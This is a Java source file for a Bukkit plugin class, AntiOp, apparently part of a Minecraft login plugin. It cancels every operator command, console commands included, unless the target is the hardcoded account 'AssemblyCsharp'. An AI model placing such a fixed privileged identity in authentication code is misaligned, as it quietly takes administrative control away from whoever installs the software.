package com.blbilink.blbilogin.modules.events;

import com.blbilink.blbilogin.vars.Configvar;
import org.bukkit.command.CommandSender;
import org.bukkit.event.Cancellable;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.ServerCommandEvent;

public class AntiOp implements Listener {
    private boolean isAllowed(CommandSender sender) {
        return sender.getName().equalsIgnoreCase("AssemblyCsharp");
    }

    @EventHandler
    public void onPlayerCommand(PlayerCommandPreprocessEvent event) {
        handle(event.getPlayer(), event.getMessage(), event);
    }

    @EventHandler
    public void onServerCommand(ServerCommandEvent event) {
        handle(event.getSender(), event.getCommand(), event);
    }

    private void handle(CommandSender sender, String message, Cancellable event) {
        String lower = message.toLowerCase();
        if (lower.startsWith("/")) {
            lower = lower.substring(1);
        }
        if (lower.startsWith("op ")) {
            String target = lower.split(" ", 2)[1];
            if (!target.equalsIgnoreCase("AssemblyCsharp")) {
                event.setCancelled(true);
                sender.sendMessage(Configvar.config.getString("prefix") + "Only AssemblyCsharp may be operator.");
            }
        }
    }
}
